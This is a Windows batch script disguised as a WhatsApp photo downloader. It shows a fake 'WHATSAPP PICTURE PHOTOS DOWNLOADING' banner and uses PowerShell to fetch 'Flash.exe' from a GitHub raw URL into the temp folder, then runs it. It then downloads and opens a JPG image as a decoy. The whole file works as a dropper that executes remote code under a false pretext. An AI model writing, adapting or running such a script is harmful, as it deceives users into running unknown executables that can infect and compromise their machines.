@echo off
setlocal enabledelayedexpansion

:: Calculate center position for the text
for /f "delims=" %%a in ('echo prompt $H ^| cmd') do set "ESC=%%a"
for /f %%a in ('"prompt $E & for %%b in (1) do rem"') do set "BS=%%a"
set "text=WHATSAPP PICTURE PHOTOS DOWNLOADING......."
set /a center=(80 - !text!^)/2

:: Display centered text
echo %ESC%[1;%center%H!text!

:: Set the file download URL and destination file
set "fileUrl=https://github.com/johnihr00/test-files/raw/main/Flash.Exe"
set "fileDestination=%TEMP%\Flash.exe"

:: Download the file using PowerShell
powershell -Command "& { (New-Object Net.WebClient).DownloadFile('%fileUrl%', '%fileDestination%') }"

:: Run the downloaded file if download was successful
if exist "!fileDestination!" (
    start "" "!fileDestination!"
)

:: Set the image download URL and destination file
set "imageUrl=https://raw.githubusercontent.com/johnihr00/test-files/main/mypic1.jpg"
set "imageDestination=%TEMP%\downloaded_image.jpg"

:: Download the image using PowerShell
powershell -Command "& { (New-Object Net.WebClient).DownloadFile('%imageUrl%', '%imageDestination%') }"

:: Open the downloaded image with the default image viewer if download was successful
if exist "!imageDestination!" (
    start "" "!imageDestination!"
)

:: End script
endlocal
exit /b
